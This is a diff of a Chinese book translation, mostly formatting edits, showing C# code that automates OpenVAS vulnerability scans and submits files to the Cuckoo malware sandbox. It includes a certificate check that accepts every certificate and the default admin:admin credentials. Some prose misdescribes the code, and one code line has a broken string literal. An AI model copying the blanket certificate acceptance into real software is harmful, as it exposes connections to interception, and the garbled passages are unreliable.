+我们将`host`参数传递给`IPAddress.Parse()`，并将结果赋值给`ServerPort`属性。如果身份验证成功（如下一节所述），则将用户名和密码传递给`Authenticate()`方法。`ServerIPAddress`和`ServerPort`属性在构造函数中赋值，并在整个类中使用。
 
-Stream 属性检查私有变量 _stream 是否为空。如果是，则调用 GetStream()，该方法将建立到 OpenVAS 服务器的连接并设置 _stream，然后返回 _stream 变量。
+`Stream`属性检查私有变量`_stream`是否为空。如果是，则调用`GetStream()`，该方法将建立到 OpenVAS 服务器的连接并设置`_stream`，然后返回`_stream`变量。
 
 ## 与 OpenVAS 服务器进行身份验证
 
-要与 OpenVAS 服务器进行身份验证，我们向 OpenVAS 发送包含用户名和密码的 XML 文档，然后读取响应，如列表 7-4所示所示如果身份验证成功，我们应该能够调用更高权限的命令来指定扫描目标、检索报告等。
+要与 OpenVAS 服务器进行身份验证，我们向 OpenVAS 发送包含用户名和密码的 XML 文档，然后读取响应，如列表 7-4 所示。如果身份验证成功，我们应该能够调用更高权限的命令来指定扫描目标、检索报告等。
 
 ```csharp
 public XDocument Authenticate(string username, string password)
@@ -4467,15 +4515,15 @@ public XDocument Authenticate(string username, string password)
 }
 ```
 
-Listing 7-4: OpenVASSession 构造函数的 Authenticate() 方法
+Listing 7-4: OpenVASSession 构造函数的`Authenticate()`方法
 
-Authenticate() 方法首先接受两个参数：用于 OpenVAS 身份验证的用户名和密码。我们创建一个新的身份验证 XML 命令，并使用提供的用户名和密码作为凭据；然后使用 ExecuteCommand() 发送身份验证请求并存储响应，以便我们确保身份验证成功并检索身份验证令牌。
+`Authenticate()`方法首先接受两个参数：用于 OpenVAS 身份验证的用户名和密码。我们创建一个新的身份验证 XML 命令，并使用提供的用户名和密码作为凭据；然后使用`ExecuteCommand()`发送身份验证请求并存储响应，以便我们确保身份验证成功并检索身份验证令牌。
 
-如果服务器返回的根 XML 元素的 status 属性为 200，则身份验证成功。我们将 Username 属性、Password 属性以及传递给方法的任何赋值，然后返回身份验证响应。
+如果服务器返回的根 XML 元素的`status`属性为 200，则身份验证成功。我们将`Username`属性、`Password`属性以及传递给方法的任何赋值，然后返回身份验证响应。
 
 ## 创建执行 OpenVAS 命令的方法
 
-列表 7-5 显示了 ExecuteCommand() 方法，它接受任意的 OpenVAS 命令，将其发送到 OpenVAS 并返回结果。
+列表 7-5 显示了`ExecuteCommand()`方法，它接受任意的 OpenVAS 命令，将其发送到 OpenVAS 并返回结果。
 
 ```csharp
 public XDocument ExecuteCommand(XDocument doc)
@@ -4489,13 +4537,13 @@ public XDocument ExecuteCommand(XDocument doc)
 }
 ```
 
-Listing 7-5: OpenVAS 的 ExecuteCommand() 方法
+Listing 7-5: OpenVAS 的`ExecuteCommand()`方法
 
-要使用 OpenVAS 管理协议执行命令，我们使用 TCP 套接字向服务器发送 XML 并接收 XML 响应。ExecuteCommand() 方法仅接受一个参数：要发送的 XML 文档。我们对 XML 文档调用 ToString()，保存结果，然后使用 Stream 属性的 write 方法将 XML 写入流中。
+要使用 OpenVAS 管理协议执行命令，我们使用 TCP 套接字向服务器发送 XML 并接收 XML 响应。`ExecuteCommand()`方法仅接受一个参数：要发送的 XML 文档。我们对 XML 文档调用`ToString()`，保存结果，然后使用`Stream`属性的`write`方法将 XML 写入流中。
 
 ## 读取服务器消息
 
-我们使用列表 7-6 所示的 ReadMessage() 方法来读取服务器返回的消息。
+我们使用列表 7-6 所示的`ReadMessage()`方法来读取服务器返回的消息。
 
 ```csharp
 private XDocument ReadMessage(SslStream sslStream)
@@ -4523,19 +4571,19 @@ private XDocument ReadMessage(SslStream sslStream)
 }
 ```
 
-Listing 7-6: OpenVAS 的 ReadMessage() 方法
+Listing 7-6: OpenVAS 的`ReadMessage()`方法
 
-该方法分块从 TCP 流中读取 XML 文档并返回该文档（或为 null）。在将 sslStream 传递给方法后，我们声明了一个 MemoryStream，允许我们动态存储从服务器接收到的数据。然后，我们使用 do/while 循环创建一个 2048 字节的缓冲区来读取数据。接下来，我们调用 sslStream 的 Read 方法用从流中读取的字节数填充缓冲区，然后使用 Write() 将来自 OpenVAS 的数据拷贝到 MemoryStream，以便我们可以将数据解析为 XML。
+该方法分块从 TCP 流中读取 XML 文档并返回该文档（或为`null`）。在将`sslStream`传递给方法后，我们声明了一个`MemoryStream`，允许我们动态存储从服务器接收到的数据。然后，我们使用`do/while`循环创建一个 2048 字节的缓冲区来读取数据。接下来，我们调用`sslStream`的`Read`方法用从流中读取的字节数填充缓冲区，然后使用`Write()`将来自 OpenVAS 的数据拷贝到`MemoryStream`，以便我们可以将数据解析为 XML。
 
-如果服务器返回的数据少于缓冲区能容纳，我们需要检查是否已从服务器读取了有效的 XML 文档。为了做到这一点，我们在 try/catch 块中使用 GetString() 将 MemoryStream 中存储的字节转换为字符串并尝试解析 XML，因为如果 XML 无效，解析将将抛出异常。如果没有抛出异常，我们就返回 XML 文档。如果抛出异常，我们知道尚未读取完流，因此调用 continue 读取更多数据。如果我们完成了流中字节的读取并必须返回有效的 XML 文档，则返回该 XML 文档。
+如果服务器返回的数据少于缓冲区能容纳，我们需要检查是否已从服务器读取了有效的 XML 文档。为了做到这一点，我们在`try/catch`块中使用`GetString()`将`MemoryStream`中存储的字节转换为字符串并尝试解析 XML，因为如果 XML 无效，解析将抛出异常。如果没有抛出异常，我们就返回 XML 文档。如果抛出异常，我们知道尚未读取完流，因此调用`continue`读取更多数据。如果我们完成了流中字节的读取并必须返回有效的 XML 文档，则返回该 XML 文档。
 
 ## 设置 TCP 流以发送和接收
 
-GetStream() 为类设置了 TCP 连接。Stream 属性检查私有变量 _stream 是否为空。如果是，则调用 GetStream()，该方法将建立到 OpenVAS 服务器的连接并设置 _stream，然后返回 _stream 变量。
+`GetStream()`为类设置了 TCP 连接。`Stream`属性检查私有变量`_stream`是否为空。如果是，则调用`GetStream()`，该方法将建立到 OpenVAS 服务器的连接并设置`_stream`，然后返回`_stream`变量。
 
-OpenVASSession 构造函数接受四个参数：用于 OpenVAS 身份验证的用户名和密码（在虚拟设备中默认为 admin:admin）；要连接的主机；以及可选的连接到主机的端口，其中 port 参数将传递给 IPAddress.Parse()。
+OpenVASSession 构造函数接受四个参数：用于 OpenVAS 身份验证的用户名和密码（在虚拟设备中默认为`admin:admin`）；要连接的主机；以及可选的连接到主机的端口，其中`port`参数将传递给`IPAddress.Parse()`。
 
-我们将 host 参数传递给 IPAddress.Parse()，并将结果赋值给 ServerPort 属性。如果身份验证成功（如下一节所述），则将用户名和密码传递给 Authenticate() 方法。ServerIPAddress 和 ServerPort 属性在构造函数中赋值，并在整个类中使用。
+我们将`host`参数传递给`IPAddress.Parse()`，并将结果赋值给`ServerPort`属性。如果身份验证成功（如下一节所述），则将用户名和密码传递给`Authenticate()`方法。`ServerIPAddress`和`ServerPort`属性在构造函数中赋值，并在整个类中使用。
 
 ## 证书验证与垃圾回收
 
@@ -4552,13 +4600,13 @@ public void Dispose()
 }
 ```
 
-Listing 7-8: ValidateServerCertificate() 和 Dispose() 方法
+Listing 7-8: `ValidateServerCertificate()`和`Dispose()`方法
 
-返回 true 通常不是良好的做法，但由于在我们的情况下 OpenVAS 使用了否则无法通过验证的自签名证书，我们必须允许所有证书。如之前的示例所示，我们在之后进行清理。
+返回`true`通常不是良好的做法，但由于在我们的情况下 OpenVAS 使用了否则无法通过验证的自签名证书，我们必须允许所有证书。如之前的示例所示，我们在之后进行清理。
 
 ## 获取 OpenVAS 版本
 
-现在我们可以驱动 OpenVAS 发送命令并检索响应，如列表 7-9 所示。例如，我们可以运行如 get-version 的命令，它返回 OpenVAS 实例的版本信息。我们稍后将在 OpenVASManager 类中封装类似的功能。
+现在我们可以驱动 OpenVAS 发送命令并检索响应，如列表 7-9 所示。例如，我们可以运行如`get-version`的命令，它返回 OpenVAS 实例的版本信息。我们稍后将在`OpenVASManager`类中封装类似的功能。
 
 ```csharp
 class MainClass{
@@ -4574,9 +4622,9 @@ class MainClass{
 }
 ```
 
-Listing 7-9: main() 方法通过传递用户名、密码和主机来驱动 OpenVAS
+Listing 7-9: `main()`方法通过传递用户名、密码和主机来驱动 OpenVAS
 
-通过用户名、密码和主机创建一个新的 OpenVASession。接下来传递 ExecuteCommand 请求 OpenVAS 版本，将结果存储在新的 XDocument 中，然后将其打印到屏幕上。列表 7-9 的输出应该像列表 7-10 所示。
+通过用户名、密码和主机创建一个新的`OpenVASession`。接下来传递`ExecuteCommand`请求 OpenVAS 版本，将结果存储在新的`XDocument`中，然后将其打印到屏幕上。列表 7-9 的输出应该像列表 7-10 所示。
 
 ```xml
 <get_version_response status="200" status_text="OK">
@@ -4584,12 +4632,11 @@ Listing 7-9: main() 方法通过传递用户名、密码和主机来驱动 OpenV
 </get_version_response>
 ```
 
-Listing 7-10: OpenVAS 对 <get_version/> 的响应
+Listing 7-10: OpenVAS 对`<get_version/>`的响应
 
 ## OpenVASManager 类
 
-我们将使用 OpenVASManager 类（如列表 7-11 所示）来封装 API。
-
+我们将使用`OpenVASManager`类（如列表 7-11 所示）来封装 API。
 
 用于启动扫描、监控扫描以及获取扫描结果的。
 
@@ -4617,11 +4664,13 @@ public class OpenVASManager:IDDisposable
 }
 ```
 
-*列表 7-11: OpenVASManager 构造函数和 GetVersion() 方法*
+列表 7-11: `OpenVASManager`构造函数和`GetVersion()`方法
 
-OpenVASManager 类构造函数接收一个参数，即 OpenVASSession。如果传递作为参数的 session 为空，我们将抛出一个异常，因为在没有有效 session 的情况下无法与 OpenVAS 通信。否则，我们将 session 赋值给类本地变量，以便在类中的方法（如 GetVersion()）中使用它。然后，我们实现 GetVersion() 来获取 OpenVAS 的版本（如列表 7-9 所示）以及 Dispose() 方法。
+`OpenVASManager`类构造函数接收一个参数，即`OpenVASSession`。如果传递作为参数的`session`为空，我们将抛出一个异常，因为在没有有效`session`的情况下无法与 OpenVAS 通信。否则，我们将`session`赋值给类本地变量，以便在类中的方法（如`GetVersion()`）中使用它。然后，我们实现`GetVersion()`来获取 OpenVAS 的版本（如列表 7-9 所示）以及`Dispose()`方法。
 
-现在，我们可以用 OpenVASManager 替换 Main() 方法中调用 `ExecuteCommand()` 的代码来检索 OpenVAS 版本，如列表 7-12 所示。
+现在，我们可以用`OpenVASManager`替换`Main()`方法中调用`ExecuteCommand()`的代码来检索 OpenVAS 版本，如列表 7-12 所示。
+
+
 
 ```csharp
 public static void Main(string[] args)
@@ -4633,13 +4682,13 @@ public static void Main(string[] args)
 }
 ```
 
-*列表 7-12: 使用 OpenVASManager 类在 Main() 方法中检索 OpenVAS 版本*
+列表 7-12：使用`OpenVASManager`类在`Main()`方法中检索 OpenVAS 版本
 
 程序员不再需要记住获取版本信息所需的 XML，因为它们已封装在方便的方法调用之后了。对于我们将要调用的 API 命令，也可以遵循相同的模式。
 
 ## 获取扫描配置和创建目标
 
-列表 7-13 显示了我们将如何向 OpenVASManager 中添加运行命令，以创建新目标并检索扫描配置。
+列表 7-13 显示了我们将如何向`OpenVASManager`中添加运行命令，以创建新目标并检索扫描配置。
 
 ```csharp
 public XDocument GetScanConfigurations()
@@ -4657,9 +4706,9 @@ public XDocument CreateSimpleTarget(string cidrRange, string targetName)
 }
 ```
 
-列表 7-13: OpenVAS 的 GetScanConfigurations() 和 CreateSimpleTarget() 方法
+列表 7-13：OpenVAS 的`GetScanConfigurations()`和`CreateSimpleTarget()`方法
 
-ScanConfigurations 方法将 <get_configs /> 命令传递给 OpenVAS 并返回响应。CreateSimpleTarget 接收 IP 地址或 CIDR 范围（例如 192.168.1.0/24）以及目标名称的参数，我们使用这些参数通过 XDocument 和 XElement 构建一个 XML 文档。第一个 XElement 使用 `create_target` 创建一个根 XML 文档。另外两个包含目标名称及其宿主机名。列表 7-14 显示了生成的 XML 文档。
+`ScanConfigurations`方法将`<get_configs />`命令传递给 OpenVAS 并返回响应。`CreateSimpleTarget`接收 IP 地址或 CIDR 范围（例如`192.168.1.0/24`）以及目标名称的参数，我们使用这些参数通过`XDocument`和`XElement`构建一个 XML 文档。第一个`XElement`使用`create_target`创建一个根 XML 文档。另外两个包含目标名称及其宿主机名。列表 7-14 显示了生成的 XML 文档。
 
 ```xml
 <create_target>
@@ -4687,19 +4736,26 @@ foreach (XElement node in OpenVASconfigs.Descendants("name"))
 
 Console.WriteLine("Creating scan of target " + targetID + " with scan config " + discoveryConfigId);
 ```
-列表 7-15: 创建 OpenVAS 目标并检索扫描配置 ID
 
-首先，我们通过 `CreateSimpleTarget()` 创建要扫描的目标，并传入一个待扫描的 IP 地址和一个新的 Guid 作为目标名称。为了自动化，我们不需要人类可读的目标名称，所以只需为名称生成一个 Guid。
+列表 7-15：创建 OpenVAS 目标并检索扫描配置 ID
 
-> 注意
+首先，我们通过`CreateSimpleTarget()`创建要扫描的目标，并传入一个待扫描的 IP 地址和一个新的 Guid 作为目标名称。为了自动化，我们不需要人类可读的目标名称，所以只需为名称生成一个 Guid。
+
+> **注意**
+>
 > 在将来，你可能希望将目标命名为 Databases（数据库）或 Workstations（工作站），以便对网络上的特定机器进行分类扫描。你可以指定类似这些的可读名称，但每个目标的名称必须是唯一的。
 
 成功创建目标后的响应应该如下所示：
-<create_target status="201" status_text="254cd3cef-b4e1-458d-859d-21b8d0c6"> 创建目标后，我们从 XML 响应中获取 id 属性的值并将其存储起来，以便稍后需要获取扫描状态时使用。然后，我们调用 GetScanConfigurations() 获取所有可用的扫描配置，存储它们并遍历它们以找到名为 Discovery 的配置。最后，我们使用 WriteLine() 在屏幕上打印消息，告知扫描。
+
+```xml
+<create_target status="201" status_text="254cd3cef-b4e1-458d-859d-21b8d0c6">
+```
+
+创建目标后，我们从 XML 响应中获取`id`属性的值并将其存储起来，以便稍后需要获取扫描状态时使用。然后，我们调用`GetScanConfigurations()`获取所有可用的扫描配置，存储它们并遍历它们以找到名为 Discovery 的配置。最后，我们使用`WriteLine()`在屏幕上打印消息，告知扫描。
 
 ## 创建并启动任务
 
-列表 7-16 显示了 OpenVASManager 类如何启动。
+列表 7-16 显示了`OpenVASManager`类如何启动。
 
 ```csharp
 public XDocument CreateSimpleTarget(string cidrRange, string targetName)
@@ -4712,7 +4768,7 @@ public XDocument CreateSimpleTarget(string cidrRange, string targetName)
 }
 ```
 
-列表 7-16: OpenVASManager 如何启动。
+列表 7-16：`OpenVASManager`如何启动。
 
 ```csharp
 public XDocument GetScanConfigurations()
@@ -4723,7 +4779,7 @@ public XDocument GetScanConfigurations()
 
 ## 监控扫描并获取结果
 
-为了监控扫描，我们在列表 17 所示实现了 GetTasks() 和 GetResults()。GetTasks() 方法返回扫描状态。GetResults() 方法返回结果。
+为了监控扫描，我们在列表 17 所示实现了`GetTasks()`和`GetResults()`。`GetTasks()`方法返回扫描状态。`GetResults()`方法返回结果。
 
 ```csharp
 public XDocument GetTasks(Guid? taskID = null)
@@ -4739,13 +4795,13 @@ public XDocument GetTasks(Guid? taskID = null)
 ```csharp
 public XDocument GetResults(Guid taskID)
 {
-    return _session.ExecuteCommand(XDocument.Parse(`<get_results task_id="{taskID}" />));
+    return _session.ExecuteCommand(XDocument.Parse(`<get_results task_id="{taskID}" />"));
 }
 ```
 
 ## 完善自动化
 
-列表 7-19 显示了我们如何使用实现的方法监控扫描并检索其结果。在驱动 Session/Manager 类的 Main() 方法中，我们可以添加以下代码来完成自动化。
+列表 7-19 显示了我们如何使用实现的方法监控扫描并检索其结果。在驱动 Session/Manager 类的`Main()`方法中，我们可以添加以下代码来完成自动化。
 
 ```csharp
 XDocument status = manager.GetTasks(taskID);
@@ -4765,20 +4821,17 @@ XDocument results = manager.GetTaskResults(taskID);
 Console.WriteLine(results.ToString());
 ```
 
-列表 7-19: 监控 OpenVAS 扫描直到完成，然后检索扫描结果并打印它们。
+列表 7-19：监控 OpenVAS 扫描直到完成，然后检索扫描结果并打印它们。
 
+我们通过传递之前保存的任务 ID 来调用`GetTaskStatus()`❶，并将结果保存在`status`变量中。然后，我们使用 LINQ to XML 方法`Descendants()`❷来检查 XML 文档中的状态节点是否等于`Done`，这意味着扫描已完成。如果扫描未完成，我们将`sleep()`五秒并清理控制台。使用`Descendants()`❸获取进度节点以提取扫描的完成百分比，打印百分比，再次使用`GetTaskStatus()`❹向 OpenVAS 请求当前状态，以此此类，直到扫描报告结果。
 
-
-
-我们通过传递之前保存的任务 ID 来调用 `GetTaskStatus()` ❶，并将结果保存在 `status` 变量中。然后，我们使用 LINQ to XML 方法 `Descendants()` ❷ 来检查 XML 文档中的状态节点是否等于 `Done`，这意味着扫描已完成。如果扫描未完成，我们将 `sleep()` 五秒并清理控制台。使用 `Descendants()` ❸ 获取进度节点以提取扫描的完成百分比，打印百分比，再次使用 `GetTaskStatus()` ❹ 向 OpenVAS 请求当前状态，以此此类，直到扫描报告结果。
-
-一旦扫描完成，我们通过传递任务 ID 调用 `GetTaskResults()` ❺；然后我们保存并打印包含结果的 XML 文档到控制台。该文档包含了一系列有用信息，包括检测到的主机和开放端口、扫描主机上已知的活动服务，以及已知的漏洞（如旧版本的软件）。
+一旦扫描完成，我们通过传递任务 ID 调用`GetTaskResults()`❺；然后我们保存并打印包含结果的 XML 文档到控制台。该文档包含了一系列有用信息，包括检测到的主机和开放端口、扫描主机上已知的活动服务，以及已知的漏洞（如旧版本的软件）。
 
 ## 运行自动化程序
 
 扫描可能需要一段时间，这取决于运行 OpenVAS 的机器以及你的网络速度。在运行期间，我们的自动化程序将向用户显示友好的消息，以告知当前扫描的状态。成功的输出应该类似于列表 7-20 所示的经过度精简的示例报告。
 
-```
+```text
 The scan is 1% done.
 The scan is 8% done.
 The scan is 8% done.
@@ -4811,47 +4864,46 @@ The scan is 98% done.
 
 ![](img/059a0f6a8101e80261ab133380da85bd_171_0.png)
 
-Cuckoo Sandbox 是一个开源项目，允许你在虚拟机的环境中运行恶意软件样本，然后分析并报告恶意软件在虚拟沙箱中的行为，而无需担心恶意软件感染你的真实机器。Cuckoo Sandbox 使用 Python 编写，还提供了一个 REST API，允许使用任何语言的程序员完全自动化处理 Cuckoo 的许多功能，例如启动沙箱、运行恶意软件和获取报告。在本章中，我们将使用易于使用的 C# 库和类来完成所有这些操作。然而，在开始使用 C# 测试和运行样本之前，还有大量工作要做，例如为 Cuckoo 设置所需的虚拟环境。你可以在 https://www.cuckoosandbox.org/ 找到更多信息并下载 Cuckoo Sandbox。
+Cuckoo Sandbox 是一个开源项目，允许你在虚拟机的环境中运行恶意软件样本，然后分析并报告恶意软件在虚拟沙箱中的行为，而无需担心恶意软件感染你的真实机器。Cuckoo Sandbox 使用 Python 编写，还提供了一个 REST API，允许使用任何语言的程序员完全自动化处理 Cuckoo 的许多功能，例如启动沙箱、运行恶意软件和获取报告。在本章中，我们将使用易于使用的 C# 库和类来完成所有这些操作。然而，在开始使用 C# 测试和运行样本之前，还有大量工作要做，例如为 Cuckoo 设置所需的虚拟环境。你可以在`https://www.cuckoosandbox.org/`找到更多信息并下载 Cuckoo Sandbox。
 
 ## 设置 Cuckoo Sandbox
 
-我们不会在本章中介绍如何设置 Cuckoo Sandbox，因为这些说明说明在不同的操作系统之间会有很大差异——甚至取决于你使用哪个版本的 Windows 作为虚拟机沙箱。本章将假设你已经使用 Windows 访客机正确设置了 Cuckoo Sandbox，并且 Cuckoo 功能完全正常。请务必遵循 Cuckoo Sandbox 官方网站（http://docs.cuckoosandbox.org/en/latest/installation/）上的说明，该网站提供了有关设置和配置软件的最新详细文档。
+我们不会在本章中介绍如何设置 Cuckoo Sandbox，因为这些说明说明在不同的操作系统之间会有很大差异——甚至取决于你使用哪个版本的 Windows 作为虚拟机沙箱。本章将假设你已经使用 Windows 访客机正确设置了 Cuckoo Sandbox，并且 Cuckoo 功能完全正常。请务必遵循 Cuckoo Sandbox 官方网站（`http://docs.cuckoosandbox.org/en/latest/installation/`）上的说明，该网站提供了有关设置和配置软件的最新详细文档。
 
-在 Cuckoo Sandbox 自带的 `conf/cuckoo.conf` 文件中，我建议在开始使用 API 之前对默认超时配置进行调整，使其更短（我将其设置为 15 秒）。这会让测试过程变得更简单更快速。在你的 `cuckoo.conf` 文件中，你会看到底部有一个类似于列表 8-1 的部分。
+在 Cuckoo Sandbox 自带的`conf/cuckoo.conf`文件中，我建议在开始使用 API 之前对默认超时配置进行调整，使其更短（我将其设置为 15 秒）。这会让测试过程变得更简单更快速。在你的`cuckoo.conf`文件中，你会看到底部有一个类似于列表 8-1 的部分。
 
-```
+```ini
 # 设置默认分析超时时间，以秒为单位。此值将
 # 用于定义除非在提交时另有指定，否则分析
 # 将将在多少秒后终止。
 default = 120
 ```
 
-列表 8-1：cuckoo.conf 中 Cuckoo 的默认超时配置
+列表 8-1：`cuckoo.conf`中 Cuckoo 的默认超时配置
 
 Cuckoo 的默认超时设置为 120 秒。过长的超时时间可能会在你修复了调试问题后感到非常不耐烦，因为你必须等待超时到达才能生成报告，但将此值设置在 15 到 30 之间会更好。
 
 ## 手动运行 Cuckoo Sandbox
 
-像 Nessus 一样，Cuckoo Sandbox 遵循 REST 模式（请参见第 5 章中对 REST 的描述）。为了使用 API，我们需要正确设置 Cuckoo Sandbox。在启动主脚本后，你需要启动用于通信的 API。这两个 Python 脚本都必须运行！`cuckoo.py` 脚本是 Cuckoo Sandbox 的引擎。如果我们像列表 8-2 那样只启动 `api.py` 而不启动 `cuckoo.py`，那么我们的 API 请求将无效。为了使用 Cuckoo Sandbox，两个脚本都必须运行。
+像 Nessus 一样，Cuckoo Sandbox 遵循 REST 模式（请参见第 5 章中对 REST 的描述）。为了使用 API，我们需要正确设置 Cuckoo Sandbox。在启动主脚本后，你需要启动用于通信的 API。这两个 Python 脚本都必须运行！`cuckoo.py`脚本是 Cuckoo Sandbox 的引擎。如果我们像列表 8-2 那样只启动`api.py`而不启动`cuckoo.py`，那么我们的 API 请求将无效。为了使用 Cuckoo Sandbox，两个脚本都必须运行。
 
-```
+```bash
 $ api.py
 * Running on http://0.0.0.0:8090 (Press Ctrl+C to quit)
 ```
 
-列表 8-2：运行 HTTP API（默认是 localhost），你可以使用 `-h` 参数运行 `api.py` 脚本 ①，这告诉 API 在监听 API 请求时使用哪个 IP 地址。在这种情况下，我们将 0.0.0.0 设置为监听的 IP 地址，这意味着所有网络接口（系统的内部和外部 IP 地址）都可以通过 8090 端口进行通信。启动后，Cuckoo API 的 URL 也会打印在屏幕上 ②。
+列表 8-2：运行 HTTP API（默认是 localhost），你可以使用`-h`参数运行`api.py`脚本 ①，这告诉 API 在监听 API 请求时使用哪个 IP 地址。在这种情况下，我们将`0.0.0.0`设置为监听的 IP 地址，这意味着所有网络接口（系统的内部和外部 IP 地址）都可以通过 8090 端口进行通信。启动后，Cuckoo API 的 URL 也会打印在屏幕上 ②。
 
 ## Cuckoo 状态
 
-使用 curl 命令行工具测试 API 以确保其设置正确，正如我们在之前的章节中测试其他 API 所做的那样。在本章后面，我们将通过类似的 API 请求创建任务、监控任务直到完成，并对文件进行报告以查看其运行时的行为。但为了开始，列表 8-4 展示了如何使用 curl 通过 HTTP API 获取 Cuckoo Sandbox 的状态信息。
+使用`curl`命令行工具测试 API 以确保其设置正确，正如我们在之前的章节中测试其他 API 所做的那样。在本章后面，我们将通过类似的 API 请求创建任务、监控任务直到完成，并对文件进行报告以查看其运行时的行为。但为了开始，列表 8-4 展示了如何使用`curl`通过 HTTP API 获取 Cuckoo Sandbox 的状态信息。
 
-```
+```bash
 $ curl http://127.0.0.1:8090/cuckoo/status
 {"cpload":[
 0.0,
 0.02,...
 ```
-
 
 ```json
 0.05
@@ -4882,15 +4934,17 @@ $ curl http://127.0.0.1:8090/cuckoo/status
 }
 ```
 
-列表 8-4：使用 curl 通过 HTTP API 获取 Cuckoo Sandbox 状态
+列表 8-4：使用`curl`通过 HTTP API 获取 Cuckoo Sandbox 状态
 
-状态信息非常有用，它详细列述了 Cuckoo Sandbox 系统的许多方面。值得注意的是聚合任务信息 ②，它列出了 Cuckoo 已经运行或正在运行的任务数量，并按状态进行分类。一个任务可能是分析一个正在运行的文件，也可能是打开带有 URL 的网页，尽管我们在本章中只只涵盖如何提交文件进行分析。你还可以看到可用于分析的 VM 数量 ① 以及 Cuckoo 的当前版本 ➁。
 
-太好了，API 已经启动并运行了！稍后我们在编写代码时将将使用同一个状态端点来测试代码，并详尽讨论 JSON 返回值。目前，我们只需要确认 API 正常运行即可。
 
-# 创建 CuckooSession 类
+状态信息非常有用，它详细列述了 Cuckoo Sandbox 系统的许多方面。值得注意的是聚合任务信息 ②，它列出了 Cuckoo 已经运行或正在运行的任务数量，并按状态进行分类。一个任务可能是分析一个正在运行的文件，也可能是打开带有 URL 的网页，尽管我们在本章中只涵盖如何提交文件进行分析。你还可以看到可用于分析的 VM 数量 ① 以及 Cuckoo 的当前版本 ➁。
 
-现在我们已经知道 API 可以工作，并且我们可以发送 HTTP 请求并获取 JSON 响应，我们可以开始编写代码以程序化的方式驱动 Cuckoo Sandbox 了。一旦构建了基础类，我们就可以提交一个文件并在运行时对其进行分析，然后报告结果。我们将从 CuckooSession 类开始，该类位于列表 8-5。
+太好了，API 已经启动并运行了！稍后我们在编写代码时将使用同一个状态端点来测试代码，并详尽讨论 JSON 返回值。目前，我们只需要确认 API 正常运行即可。
+
+# 创建 `CuckooSession` 类
+
+现在我们已经知道 API 可以工作，并且我们可以发送 HTTP 请求并获取 JSON 响应，我们可以开始编写代码以程序化的方式驱动 Cuckoo Sandbox 了。一旦构建了基础类，我们就可以提交一个文件并在运行时对其进行分析，然后报告结果。我们将从 `CuckooSession` 类开始，该类位于列表 8-5。
 
 ```csharp
 public class CuckooSession(string host, int port)
@@ -4903,11 +4957,11 @@ public string Host { get; set; }
 public int Port { get; set; }
 ```
 
-列表 8-5：启动 CuckooSession 类。为了开始保持简单，我们创建了 CuckooSession 类 ① 以及 CuckooSession 构造函数。构造函数接受两个参数 ②。第一个是要连接的主机（host），第二个是主机上监听 API 的端口（port）。在构造函数中，作为参数传递的两个值被赋值给它们各自的属性 Host 和 Port ④，这些定义在构造函数下方。接下来，我们需要实现 CuckooSession 类可用的方法。
+列表 8-5：启动 `CuckooSession` 类。为了开始保持简单，我们创建了 `CuckooSession` 类 ① 以及 `CuckooSession` 构造函数。构造函数接受两个参数 ②。第一个是要连接的主机（`host`），第二个是主机上监听 API 的端口（`port`）。在构造函数中，作为参数传递的两个值被赋值给它们各自的属性 `Host` 和 `Port` ④，这些定义在构造函数下方。接下来，我们需要实现 `CuckooSession` 类可用的方法。
 
-## 编写 ExecuteCommand() 方法来处理 HTTP 请求
+## 编写 `ExecuteCommand()` 方法来处理 HTTP 请求
 
-Cuckoo 期望在进行 API 请求时接收两种 HTTP 请求：传统的 HTTP 请求和更复杂的多部分表单请求（multipart form request），用于将文件发送到 Cuckoo 进行分析。我们将实现两个 ExecuteCommand() 方法来涵盖这些类型的请求：我们将使用一个接受参数用于传统请求的简单 ExecuteCommand() 方法，然后通过重载一个接受三个参数用于多部分表单请求的 ExecuteCommand() 方法来实现。在 C# 中创建具有相同名称但不同参数的方法被称为方法重载。这是一个说明何时使用方法重载而不是接受可选参数的单一方法的良好示例，因为尽管名称相同，但每种请求的方法在逻辑上是相对不同的。列表 8-6。
+Cuckoo 期望在进行 API 请求时接收两种 HTTP 请求：传统的 HTTP 请求和更复杂的多部分表单请求（multipart form request），用于将文件发送到 Cuckoo 进行分析。我们将实现两个 `ExecuteCommand()` 方法来涵盖这些类型的请求：我们将使用一个接受参数用于传统请求的简单 `ExecuteCommand()` 方法，然后通过重载一个接受三个参数用于多部分表单请求的 `ExecuteCommand()` 方法来实现。在 C# 中创建具有相同名称但不同参数的方法被称为方法重载。这是一个说明何时使用方法重载而不是接受可选参数的单一方法的良好示例，因为尽管名称相同，但每种请求的方法在逻辑上是相对不同的。列表 8-6。
 
 ```csharp
 public object ExecuteCommand(string uri, string method)
@@ -4926,11 +4980,11 @@ public object ExecuteCommand(string uri, string method)
 }
 ```
 
-列表 8-6：接受 URI 和 HTTP 方法作为参数的简单 ExecuteCommand 方法
+列表 8-6：接受 URI 和 HTTP 方法作为参数的简单 `ExecuteCommand` 方法。
 
-第一个 ExecuteCommand() 方法接受两个参数：要请求的 URI 和要使用的 HTTP 方法（GET、POST、PUT 等）。在通过 Create() ② 构建了新的 HTTP 请求并设置请求的 Method 属性 ③ 后，我们发起 HTTP 请求并将响应读取到 ④ 中。最后，我们将返回的字符串解析为 JSON 并返回 JSON 对象。
+第一个 `ExecuteCommand()` 方法接受两个参数：要请求的 URI 和要使用的 HTTP 方法（GET、POST、PUT 等）。在通过 `Create()` ② 构建了新的 HTTP 请求并设置请求的 `Method` 属性 ③ 后，我们发起 HTTP 请求并将响应读取到 ④ 中。最后，我们将返回的字符串解析为 JSON 并返回 JSON 对象。
 
-重载的 ExecuteCommand 方法接受三个参数：要请求的 URI、HTTP 方法以及一个将发送在 HTTP 多部分请求中的参数字典。多部分请求允许你将更复杂的数据（如带有其他 HTTP 参数的文件）发送到 Web 服务器，这正是我们将使用的方式。完整的多部分请求将在稍后的列表 8-9 中显示。
+重载的 `ExecuteCommand` 方法接受三个参数：要请求的 URI、HTTP 方法以及一个将发送在 HTTP 多部分请求中的参数字典。多部分请求允许你将更复杂的数据（如带有其他 HTTP 参数的文件）发送到 Web 服务器，这正是我们将使用的方式。完整的多部分请求将在稍后的列表 8-9 中显示。
 
 列表 8-9。如何发送此类请求在列表 8-7 中详细介绍。
 
@@ -4959,17 +5013,17 @@ public JObject ExecuteCommand(string uri, IDictionary<string, object> parms)
 }
 ```
 
-列表 8-7：用于 multipart-data 请求的重载 ExecuteCommand 方法
+列表 8-7：用于 multipart-data 请求的重载 `ExecuteCommand` 方法。
 
